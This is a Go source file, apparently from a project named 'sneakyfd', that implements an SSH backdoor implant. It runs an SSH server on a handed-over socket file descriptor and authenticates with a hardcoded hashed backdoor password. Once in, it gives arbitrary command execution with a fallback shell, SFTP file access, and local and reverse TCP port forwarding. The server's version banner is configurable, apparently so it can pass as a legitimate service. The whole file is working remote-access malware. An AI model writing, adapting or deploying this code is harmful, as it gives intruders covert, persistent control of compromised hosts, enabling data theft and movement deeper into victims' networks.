package handler

import (
	"context"
	"crypto/sha256"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"

	"sneakyfd/config"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	"github.com/rs/zerolog"
	gossh "golang.org/x/crypto/ssh"
)

func fdToConn(fd int) (conn net.Conn, err error) {
	file := os.NewFile(uintptr(fd), "socket")
	if file == nil {
		err = os.ErrInvalid
		return
	}
	defer file.Close() // FileConn duplicates the fd, so we can close file
	conn, err = net.FileConn(file)
	return
}

func shellHandler(s ssh.Session, log *zerolog.Logger) {
	args := s.Command()

	if len(args) == 0 {
		args = config.BackdoorFallbackShell
	}

	log.Info().Strs("shell_command", args).Msg("New shell channel")
	defer log.Info().Msg("Shell channel done")
	cmd := exec.Command(args[0], args[1:]...)

	cmd.Stdin = s
	cmd.Stdout = s
	cmd.Stderr = s

	err := cmd.Run()

	if err != nil {
		log.Error().
			Err(err).
			Msg("Shell command execution failed")
		if exitError, ok := err.(*exec.ExitError); ok {
			// Return the actual exit code of the command
			_ = s.Exit(exitError.ExitCode())
		} else {
			// Return a generic error code
			_ = s.Exit(1)
		}
	} else {
		// Success
		_ = s.Exit(0)
	}
}

func sftpHandler(s ssh.Session, log *zerolog.Logger) {
	log.Info().Msg("New sftp channel")
	defer log.Info().Msg("Sftp channel done")
	debugStream := io.Discard
	serverOptions := []sftp.ServerOption{
		sftp.WithDebug(debugStream),
	}
	server, err := sftp.NewServer(
		s,
		serverOptions...,
	)
	if err != nil {
		log.Error().
			Err(err).
			Msg("Initialize sftp server failed")
		return
	}
	if err := server.Serve(); err == io.EOF {
		server.Close()
	} else if err != nil {
		log.Error().
			Err(err).
			Msg("Sftp server failed")
	}
}

func passwordHandler(ctx ssh.Context, password string, log *zerolog.Logger) bool {
	hashedPassword := fmt.Sprintf("%x", sha256.Sum256([]byte(password)))
	if config.BackdoorHashedPassword == hashedPassword {
		log.Info().Msg("Auth success")
		return true
	}
	log.Error().Msg("Auth failed")
	return false
}

func noPtyCallback(ctx ssh.Context, pty ssh.Pty) bool {
	return false
}

func handleBackdoor(ctx context.Context, fd int) {
	log := zerolog.Ctx(ctx)

	log.Info().Msg("Starting backdoor")

	conn, err := fdToConn(fd)
	if err != nil {
		log.Error().
			Err(err).
			Msg("Convert fd to net.Conn failed")
		return
	}
	defer conn.Close()

	signer, err := gossh.ParsePrivateKey(config.BackdoorHostSignerPrivKey)
	if err != nil {
		log.Error().
			Err(err).
			Msg("Parse host signer private key failed")
		return
	}

	forwardHandler := &ssh.ForwardedTCPHandler{}

	sshServer := &ssh.Server{
		Handler: func(s ssh.Session) {
			shellHandler(s, log)
		},
		PasswordHandler: func(ctx ssh.Context, password string) bool {
			return passwordHandler(ctx, password, log)
		},
		LocalPortForwardingCallback: func(ctx ssh.Context, dhost string, dport uint32) bool {
			log.Info().Str("host", dhost).Uint32("port", dport).Msg("New local forwarding channel")
			return true
		},
		ReversePortForwardingCallback: func(ctx ssh.Context, host string, port uint32) bool {
			log.Info().Uint32("port", port).Str("host", host).Msg("New remote forwarding channel")
			return true
		},
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": func(s ssh.Session) {
				sftpHandler(s, log)
			},
		},
		PtyCallback: noPtyCallback,
		HostSigners: []ssh.Signer{signer},
		Version:     config.BackdoorVersionBanner,
		ChannelHandlers: map[string]ssh.ChannelHandler{
			"session":      ssh.DefaultSessionHandler,
			"direct-tcpip": ssh.DirectTCPIPHandler, // TODO: patch library to support custom timeout
		},
		RequestHandlers: map[string]ssh.RequestHandler{
			"tcpip-forward":        forwardHandler.HandleSSHRequest,
			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
		},
	}

	sshServer.HandleConn(conn)
}
